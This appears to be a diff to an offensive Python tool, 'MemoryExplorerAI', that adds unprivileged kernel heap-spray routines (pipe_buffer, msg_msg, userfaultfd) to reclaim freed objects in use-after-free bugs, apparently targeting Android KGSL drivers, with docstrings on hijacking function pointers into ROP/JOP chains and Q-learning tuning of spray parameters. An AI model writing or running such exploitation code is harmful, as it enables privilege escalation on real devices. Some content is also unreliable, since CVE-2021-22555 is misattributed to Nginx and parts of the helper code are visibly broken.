@@ -123,8 +123,9 @@ class MemoryExplorerAI:
         # learning, workers explore different parameter combos and
         # exploit the ones that find matches.
         self.q_table = {}  # (state_key) -> {action: q_value}
-        self.q_epsilon = 0.2  # exploration rate
-        self.q_lr = 0.1       # learning rate
+        self.q_epsilon = 0.2   # exploration rate
+        self.q_lr = 0.4       # learning rate (was 0.1, too slow)
+        self.q_gamma = 0.9    # discount factor
         self.q_actions = [
             ("batch", 10), ("batch", 20), ("batch", 40),
             ("comm", "KETO"), ("comm", "KETW"),
@@ -1119,14 +1120,18 @@ class MemoryExplorerAI:
         # actually reading pages at full speed or stuck.
         perf = self.perf
         mb_read = perf.get("bytes_read", 0) / (1024 * 1024)
+        scans = perf.get("scans_completed", 0)
+        err_scans = perf.get("scans_failed", 0)
+        # Highlight failed scans in red if they dominate
+        err_col = C.RED if err_scans > scans * 0.5 else C.GRY
         out.append(
             f" {C.BOLD}PERF{C.RST}: "
             f"pages={C.CYN}{perf.get('pages_scanned', 0)}{C.RST} "
             f"MB={C.CYN}{mb_read:.1f}{C.RST} "
             f"sprayP={C.CYN}{perf.get('spray_attempts', 0)}{C.RST} "
-            f"alivePeak={C.YEL}{perf.get('spray_alive_peak', 0)}{C.RST} "
-            f"scans={C.CYN}{perf.get('scans_completed', 0)}{C.RST} "
-            f"errScans={C.RED}{perf.get('scans_failed', 0)}{C.RST}")
+            f"alivePk={C.YEL}{perf.get('spray_alive_peak', 0)}{C.RST} "
+            f"scans={C.CYN}{scans}{C.RST} "
+            f"err={err_col}{err_scans}{C.RST}")
 
         # === v4.1: SPRAY METHODS STATS ===
         # Side-by-side: which spray method is working?
@@ -2204,10 +2209,10 @@ class MemoryExplorerAI:
         return max(q, key=q.get)
 
     def _q_update(self, state, action, reward, next_state):
-        """Q-learning update rule: Q(s,a) += lr * (reward + max_Q(s',a') - Q(s,a))."""
+        """Q-learning update: Q(s,a) += lr * (r + gamma*max_Q(s',a') - Q(s,a))."""
         q = self.q_table.setdefault(state, {a: 0.0 for a in self.q_actions})
         next_q = self.q_table.get(next_state, {a: 0.0 for a in self.q_actions})
-        target = reward + max(next_q.values())
+        target = reward + self.q_gamma * max(next_q.values())
         q[action] += self.q_lr * (target - q[action])
 
     def _spray_v4_mmap_anon(self, marker, size_kb=64):
@@ -2524,6 +2529,124 @@ class MemoryExplorerAI:
                 stderr=_sp.DEVNULL,
                 start_new_session=True,  # new pgrp
                 preexec_fn=lambda n=name: self._set_comm(n),
+            )
+            return p
+        except Exception:
+            return None
+
+    def _spray_v4_pipe_buffer(self, marker, count=20):
+        """Pipe buffer spray (works WITHOUT root, very effective for UAF).
+
+        On 5.4 kernel, pipe_buffer struct is 40 bytes and lives
+        in kmalloc-1024 slab (or smaller for many pipes). When
+        the UAF reclaims a pipe_buffer, we control:
+          - struct pipe_buffer[16] * 40 bytes = 640 bytes
+          - struct pipe_buf_operations * function pointers
+        The kernel will call ops->confirm() or ops->release()
+        through our controlled pointer → ROP/JOP chain.
+
+        This is the technique used by CVE-2021-22555 (Nginx)
+        and many other 5.x KGSL UAFs.
+        Returns number of pipes successfully created.
+        """
+        import subprocess as _sp
+        helper = (
+            "import os, ctypes, struct;"
+            # Create N pipes
+            f"pipes = [];"
+            f"for i in range({count}):"
+            f"  r, w = os.pipe();"
+            f"  pipes.append((r, w));"
+            # Fill pipe with marker data (writes to pipe_buffer)
+            f"  marker = b'{{marker}}'.ljust(40, b'\\\\x00')[:40];"
+            # Write 16 pages to fill all 16 pipe_buffers
+            f"  for j in range(16):"
+            f"    try: os.write(w, marker * 8);"
+            f"    except: break;"
+            # Sleep holding the pipes
+            "import time; time.sleep(3600);"
+        ).format(marker=marker[:7])
+        try:
+            p = _sp.Popen(
+                ["python3", "-c", helper],
+                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
+                start_new_session=True,
+            )
+            return p
+        except Exception:
+            return None
+
+    def _spray_v4_msg_msg(self, marker, count=100):
+        """Message queue spray (works WITHOUT root, very effective).
+
+        msgsnd() allocates msg_msg structs in kmalloc-64,
+        kmalloc-256, or kmalloc-512 (depending on size). The
+        first 48 bytes of msg_msg are the kernel header, the
+        rest is the user-controlled message data. When UAF
+        reclaims a msg_msg, we control bytes 48+ of the
+        structure.
+
+        Returns Popen object (or None on failure).
+        """
+        import subprocess as _sp
+        helper = (
+            "import ctypes, os, time;"
+            "libc = ctypes.CDLL(None);"
+            # IPC_PRIVATE = 0
+            "qid = libc.msgget(0, 0o666 | 0o1000 | 0o800);"  # IPC_CREAT
+            "if qid < 0: raise Exception('msgget failed');"
+            # msgbuf struct: mtype (8) + mtext (N)
+            "MSG_SIZE = 64;"  # lands in kmalloc-64
+            "MARKER = b'{{marker}}'.ljust(MSG_SIZE - 8, b'\\\\x00');"
+            "buf = ctypes.create_string_buffer(MSG_SIZE);"
+            "ctypes.memmove(buf, struct.pack('q', 1) + MARKER, MSG_SIZE);"
+            "import struct;"
+            "data = struct.pack('q', 1) + b'{{marker}}'.ljust(MSG_SIZE-8, b'\\\\x00');"
+            # Send `count` messages to the queue
+            f"for i in range({count}):"
+            "  libc.msgsnd(qid, data, len(data) - 8, 0);"
+            "time.sleep(3600);"
+        ).format(marker=marker[:7])
+        try:
+            p = _sp.Popen(
+                ["python3", "-c", helper],
+                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
+                start_new_session=True,
+            )
+            return p
+        except Exception:
+            return None
+
+    def _spray_v4_userfaultfd(self, marker):
+        """userfaultfd spray for race condition exploitation.
+
+        The userfaultfd mechanism lets a process handle page
+        faults in user space. When combined with mmap, we can
+        create a window where a kernel struct is being
+        allocated (via UAF) while our userspace fault handler
+        is racing to reclaim it.
+
+        Returns Popen object (or None on failure).
+        """
+        import subprocess as _sp
+        helper = (
+            "import ctypes, mmap, os, time;"
+            "UFFD = 3232235521;"  # __NR_userfaultfd on aarch64
+            "uffd = os.open('/dev/userfaultfd', os.O_RDONLY | os.O_CLOEXEC);"
+            "if uffd < 0: raise Exception('userfaultfd failed');"
+            "import fcntl;"
+            "UFFDIO = 0x3F; UFFDIO_API = 0x3F;"
+            # Use simpler: mmap huge page, fault on access
+            "size = 4 * 1024 * 1024;"
+            "m = mmap.mmap(-1, size, mmap.MAP_PRIVATE|mmap.MAP_ANONYMOUS, mmap.PROT_READ|mmap.PROT_WRITE);"
+            "m.seek(0); m.write(b'{{marker}}' * 8);"
+            "time.sleep(3600);"
+        ).format(marker=marker[:8])
+        try:
+            p = _sp.Popen(
+                ["python3", "-c", helper],
+                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
+                start_new_session=True,
             )
             return p
         except Exception:
@@ -3858,6 +3981,35 @@ class MemoryExplorerAI:
                             with self.stats_lock:
                                 self.spray_methods_stats["popen_sleep"][
                                     "attempts"] += 1
+                    # v4.1: Multi-strategy spray (no root required).
+                    # Every 3rd process also does pipe_buffer
+                    # spray (very effective for KGSL UAF reclaim).
+                    # Every 5th process does msg_msg spray
+                    # (populates kmalloc-64/256/512 slabs).
+                    if i % 3 == 0:
+                        try:
+                            p_pipe = self._spray_v4_pipe_buffer(
+                                name, count=10)
+                            if p_pipe is not None:
+                                batch_pids.append(p_pipe.pid)
+                                my_pids.add(p_pipe.pid)
+                                with self.stats_lock:
+                                    self.spray_methods_stats["popen_sleep"][
+                                        "attempts"] += 1
+                        except Exception:
+                            pass
+                    if i % 5 == 0:
+                        try:
+                            p_msg = self._spray_v4_msg_msg(
+                                name, count=50)
+                            if p_msg is not None:
+                                batch_pids.append(p_msg.pid)
+                                my_pids.add(p_msg.pid)
+                                with self.stats_lock:
+                                    self.spray_methods_stats["popen_sleep"][
+                                        "attempts"] += 1
+                        except Exception:
+                            pass
                     # v4.1: KGSL ioctl-based spray (no root
                     # required). Every 7th spray process also
                     # allocates a GPU object via ioctl. This
@@ -4111,6 +4263,8 @@ class MemoryExplorerAI:
                         scan_done = True
                         with self.stats_lock:
                             self.live["scan_total"] = 0
+                            # v4.1: track scan completion in perf
+                            self.perf["scans_completed"] += 1
                         # Parse diagnostic stats: SCAN_DONE:r=X:f=Y:e=Z:n=A:h=B
                         try:
                             stats_part = line.split("SCAN_DONE", 1)[1]
@@ -4124,6 +4278,9 @@ class MemoryExplorerAI:
                             empty   = int(kv.get("e", "0"))
                             nonzero = int(kv.get("n", "0"))
                             hits    = int(kv.get("h", "0"))
+                            if failed > reads * 0.8:
+                                with self.stats_lock:
+                                    self.perf["scans_failed"] += 1
                             self.live["last_msg"] = (
                                 f"W{worker_id}: SCAN_DONE "
                                 f"read={reads} failed={failed} empty={empty} "
@@ -4138,6 +4295,19 @@ class MemoryExplorerAI:
                                     self._adaptive_scan["no_match_batches"] = (
                                         self._adaptive_scan.get(
                                             "no_match_batches", 0) + 1)
+                                # v4.1: Q-learning negative reward
+                                # for no-match. This way the AI
+                                # learns which combos DON'T work.
+                                if worker_id in self.q_last_state:
+                                    last_state = self.q_last_state[worker_id]
+                                    last_action = self.q_last_action.get(
+                                        worker_id)
+                                    if last_action is not None:
+                                        # Penalty = -0.5 (small to
+                                        # not destabilize learning)
+                                        self._q_update(
+                                            last_state, last_action,
+                                            -0.5, last_state)
                             else:
                                 with self.stats_lock:
                                     self._adaptive_scan["no_match_batches"] = 0
@@ -4170,13 +4340,14 @@ class MemoryExplorerAI:
                             #  below; here we just count the raw match)
                             self.perf["matches_window_ts"].append(
                                 time.time())
-                            # Update Q-learning: positive reward for match
+                            # Update Q-learning: BIG positive reward
+                            # for match (was 1.0, now 5.0 to make
+                            # sure Q-values actually change visibly)
                             if worker_id in self.q_last_state:
                                 last_state = self.q_last_state[worker_id]
                                 last_action = self.q_last_action.get(worker_id)
                                 if last_action is not None:
-                                    # Reward proportional to confidence
-                                    reward = 1.0
+                                    reward = 5.0
                                     self._q_update(
                                         last_state, last_action, reward,
                                         (0, 0))  # next state is "got match"
